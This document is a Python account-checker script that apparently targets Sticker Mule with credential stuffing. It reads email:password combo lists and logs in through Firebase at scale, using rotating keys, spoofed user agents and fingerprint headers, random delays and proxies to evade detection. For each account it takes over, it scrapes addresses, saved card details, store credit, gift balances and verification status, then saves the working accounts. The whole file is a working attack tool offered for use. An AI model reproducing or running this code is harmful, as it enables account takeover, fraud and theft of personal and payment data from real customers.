#!/usr/bin/env python3
"""
check.py
Library & interactive CLI untuk:
- Rotating modes (HTML vs GraphQL)
- Random UA dari public API
- Fingerprint headers
- Optional proxy
- Manual input: combos, threads, delay, save, proxy
"""
import os, time, random, uuid, re, base64, argparse, requests
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# ==== Config ====
UA_API_URL = "https://headers.scrapeops.io/v1/user-agents"
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/102.0"
]
PROXIES = None
API_KEYS = cycle([
    os.getenv("FIREBASE_API_KEY1", "AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU"),
    os.getenv("FIREBASE_API_KEY2", "AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU")
])
mode_cycle = cycle(["1","2"])
stats_lock = Lock()
status_stats = {"checked":0,"live_paid":0,"live_free":0,"expired":0,"failed":0}
start_time = time.time()

# ==== Utils ====
def fetch_user_agents():
    try:
        r = requests.get(UA_API_URL, timeout=5)
        js = r.json().get("result")
        if isinstance(js,list) and js:
            return js
    except:
        pass
    return DEFAULT_USER_AGENTS

USER_AGENTS = fetch_user_agents()
UA_CYCLE = cycle(USER_AGENTS)

def get_random_ua():
    return next(UA_CYCLE)

def random_guid():
    return str(uuid.uuid4())

def generate_fingerprint_headers():
    return {
        "x-guid": random_guid(),
        "x-fingerprint": random_guid(),
        "x-client-version": "Chrome/JsCore/9.1.2/FirebaseCore-web",
        "sec-ch-ua": '"Chromium";v="125", "Not.A/Brand";v="8"',
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors"
    }

def random_delay(a=0.0,b=1.5):
    time.sleep(random.uniform(a,b))

def get_next_api_key():
    return next(API_KEYS)

def update_stats(k):
    with stats_lock:
        status_stats[k] = status_stats.get(k,0) + 1

def debug_log(email,msg):
    with open("debug_log.txt","a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {email} - {msg}\n")

def print_stats():
    elapsed = max(time.time()-start_time,1)
    cpm = status_stats["checked"]*60/elapsed
    print(Fore.CYAN + 
        f"[CPM:{cpm:.2f}] Checked:{status_stats['checked']} "
        f"Paid:{status_stats['live_paid']} Free:{status_stats['live_free']} "
        f"Exp:{status_stats['expired']} Fail:{status_stats['failed']}"
    )

# ==== Parsing Mode1 ====
def parse_address(html):
    m = re.search(r'Shipping addresses</p><p class="jsx-[^"]+ value regular">(.*?)<', html, re.DOTALL)
    if m and m.group(1).strip():
        return m.group(1).strip()
    m2 = re.findall(
        r'{"__typename":"Address","addressLine1":"(.*?)".*?"cityName":"(.*?)".*?"countryName":"(.*?)".*?"zipCode":"(.*?)"',
        html, re.DOTALL
    )
    if m2:
        a=m2[0]
        return f"{a[0]}, {a[1]}, {a[2]}, {a[3]}"
    return "-"

def parse_cards_from_json(html):
    cards = re.findall(
        r'{"__typename":"PaymentMethodCreditCard".*?"issuer":"(.*?)".*?"month":(\d+),"year":(\d+).*?"lastDigits":"(\d+)"',
        html, re.DOTALL
    )
    if not cards: return "-"
    return " | ".join(f"{iss.capitalize()} Exp {int(m):02d}/{y} ****{l}" 
                      for iss,m,y,l in cards)

def extract_store_credit(html):
    m = re.search(r'Store credit.*?<p class="jsx-[^"]+ balance regular">(.*?)</p>', html, re.DOTALL|re.IGNORECASE)
    return m.group(1).strip() if m else "-"

def extract_gift_card(html):
    m = re.search(r'Gift card.*?<p class="jsx-[^"]+ balance regular">(.*?)</p>', html, re.DOTALL|re.IGNORECASE)
    return m.group(1).strip() if m else "-"

def extract_centang(html):
    m = re.search(r'ID Verification</p><p class="jsx-[^"]+ value regular">(.*?)<', html)
    if m:
        s=m.group(1).strip().lower()
        if s=="verified": return "Verified"
        if s=="unverified": return "Unverified"
        return s.capitalize()
    return "-"

# ==== Mode1 Check ====
def login_firebase(email,pw):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={get_next_api_key()}"
    hdr={"User-Agent":get_random_ua(),"Content-Type":"application/json","Origin":"https://www.stickermule.com"}
    hdr.update(generate_fingerprint_headers())
    kw = {'proxies':PROXIES} if PROXIES else {}
    random_delay()
    r = requests.post(url, headers=hdr, json={"email":email,"password":pw,"returnSecureToken":True}, timeout=15, **kw)
    tok=r.json().get("idToken")
    if not tok:
        update_stats("failed"); debug_log(email,"Mode1 login failed")
    return tok

def check_mode1(email,pw,token):
    try:
        sess=requests.Session()
        if PROXIES: sess.proxies.update(PROXIES)
        hdr={"User-Agent":get_random_ua(),"Content-Type":"application/json","Origin":"https://www.stickermule.com"}
        hdr.update(generate_fingerprint_headers())
        random_delay()
        r1=sess.post("https://www.stickermule.com/session-cookie", headers=hdr, json={"idToken":token}, timeout=15)
        ck=r1.cookies.get("auth-stickermule_com")
        if not ck:
            update_stats("failed"); debug_log(email,"Mode1 no cookie"); return False,""
        sess.cookies.set("auth-stickermule_com",ck)
        random_delay()
        r2=sess.get("https://www.stickermule.com/account", headers=hdr, timeout=15)
        if r2.status_code==200 and "account" in r2.url:
            h=r2.text
            addr=parse_address(h)
            crd=parse_cards_from_json(h)
            st=extract_store_credit(h)
            gf=extract_gift_card(h)
            vr=extract_centang(h)
            update_stats("checked"); update_stats("live_paid"); debug_log(email,"Mode1 OK")
            detail=f"Addr:{addr} | Cards:{crd} | Store:{st} | Gift:{gf} | Verif:{vr}"
            print(Fore.YELLOW+"[DETAILS] "+detail)
            return True,detail
        update_stats("failed"); debug_log(email,f"Mode1 status {r2.status_code}"); return False,""
    except Exception as e:
        update_stats("failed"); debug_log(email,f"Mode1 err {e}"); return False,""

# ==== Mode2 Check ====
def login_and_lookup(email,pw):
    key=get_next_api_key()
    url=f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key}"
    hdr={"User-Agent":get_random_ua(),"Content-Type":"application/json","Origin":"https://www.stickermule.com"}
    hdr.update(generate_fingerprint_headers())
    kw={'proxies':PROXIES} if PROXIES else {}
    random_delay()
    r=requests.post(url,headers=hdr,json={"email":email,"password":pw,"returnSecureToken":True},timeout=15,**kw)
    tok=r.json().get("idToken")
    if not tok:
        update_stats("failed"); debug_log(email,"Mode2 login fail"); return False,""
    sess=requests.Session()
    if PROXIES: sess.proxies.update(PROXIES)
    sess.headers.update(hdr)
    random_delay()
    sess.post("https://www.stickermule.com/session-cookie",json={"idToken":tok},timeout=5,**kw)
    auth=sess.cookies.get("auth-stickermule_com")
    if not auth:
        update_stats("failed"); debug_log(email,"Mode2 no cookie"); return False,""
    # Stripe fingerprinting
    payload=base64.b64decode("...")  # your payload
    guid=random_guid()
    hdr2={"Host":"m.stripe.com","Cookie":f"m={guid}","Content-Length":str(len(payload)),"User-Agent":get_random_ua(),"Content-Type":"text/plain;charset=UTF-8"}
    random_delay()
    r2=requests.post("https://m.stripe.com/6",headers=hdr2,data=payload,timeout=5,**kw)
    try:
        j=r2.json()
        sess.cookies.update({"__stripe_mid":j.get("muid",""),"__stripe_sid":j.get("sid",""),"guid":j.get("guid",""),"auth-stickermule_com":auth})
    except:
        update_stats("failed"); debug_log(email,"Mode2 stripe fail"); return False,""
    # GraphQL
    gql="https://www.stickermule.com/bridge/backend/graphql"
    queries={
        "address":{"op":"SAVED_ADDRESSES_QUERY","q":"query { shippingAddresses{addressLine1 cityName countryName zipCode} billingAddresses{addressLine1 cityName countryName zipCode} }"},
        "payment":{"op":"SAVED_PAYMENT_METHODS_QUERY","q":"query { sessionStatus{user{paymentMethods{issuer expiration{month year} lastDigits}}}}"},
        "profile":{"op":"SESSION_STATUS_QUERY","q":"query { sessionStatus{user{fullName email storeCredit availableWalletBalance{amount currency} isIdentityVerified}}}"}
    }
    parts=[]
    for k,v in queries.items():
        random_delay()
        r3=sess.post(gql,json={"operationName":v["op"],"query":v["q"],"variables":{}},timeout=15)
        parts.append(f"{k}:{r3.json().get('data',{})}")
    update_stats("checked"); update_stats("live_paid"); debug_log(email,"Mode2 OK")
    detail=" | ".join(parts)
    print(Fore.YELLOW+f"[MODE2] {email} | {detail}")
    return True,detail

# ==== Runner & Menu for Option 10 ====
def account_multi_api_menu():
    """Interactive menu for option 10: Checker Account Multi API with colored modes."""
    global PROXIES
    print(Fore.GREEN + "\n=== Checker Account Multi Api ===")
    combos_file = input("Masukkan path file combos (email:pass): ").strip()
    while not combos_file or not os.path.isfile(combos_file):
        combos_file = input(Fore.RED + "Path tidak valid. Coba lagi: ").strip()
    thr = input("Jumlah threads (default 10): ").strip()
    threads = int(thr) if thr.isdigit() else 10
    dl = input("Delay antar API (detik, default 1): ").strip()
    try: delay = float(dl)
    except: delay = 1.0
    save_file = input("Nama file untuk simpan akun paid (default paid.txt): ").strip() or "paid.txt"
    proxy = input("Proxy (host:port, kosong jika tidak): ").strip()
    if proxy:
        PROXIES = {"http":proxy,"https":proxy}

    combos = [l.strip() for l in open(combos_file) if l.strip()]
    paid=[]
    for combo in combos:
        email,pw = combo.split(":",1)
        md = next(mode_cycle)
        if md=="1":
            color, tag = Fore.BLUE, "[MODE1]"
            tok = login_firebase(email,pw)
            ok, det = check_mode1(email,pw,tok) if tok else (False,"")
        else:
            color, tag = Fore.MAGENTA, "[MODE2]"
            ok, det = login_and_lookup(email,pw)
        line = f"{combo} | {det}"
        if ok:
            print(color + f"{tag} LIVE   {line}")
            paid.append(combo)
        else:
            print(Fore.RED + f"{tag} FAILED {line}")
        time.sleep(delay)

    if save_file:
        with open(save_file,"w") as f:
            for p in paid: f.write(p+"\n")
        print(Fore.GREEN + f"\nJumlah akun paid: {len(paid)}. Disimpan di {save_file}")

def run_checks(combos, threads=10, save_file=None):
    """Mass runner (programmatic)."""
    f = open(save_file,"a") if save_file else None
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs={}
        for c in combos:
            fn = check_mode1 if next(mode_cycle)=="1" else login_and_lookup
            futs[ex.submit(fn,*c.split(":",1))]=c
        for ftr, c in futs.items():
            try:
                ok, det = ftr.result()
                out = f"[{'LIVE' if ok else 'FAILED'}] {c}"
                print(Fore.GREEN+out if ok else Fore.RED+out)
                if f: f.write(out+" | "+det+"\n")
            except Exception as e:
                err = f"[ERROR] {c} - {e}"
                print(Fore.RED+err); update_stats("failed")
                if f: f.write(err+"\n")
    if f: f.close()

def interactive_menu():
    print(Fore.GREEN + "=== Mass Account Checker ===")
    account_multi_api_menu()

if __name__=="__main__":
    interactive_menu()
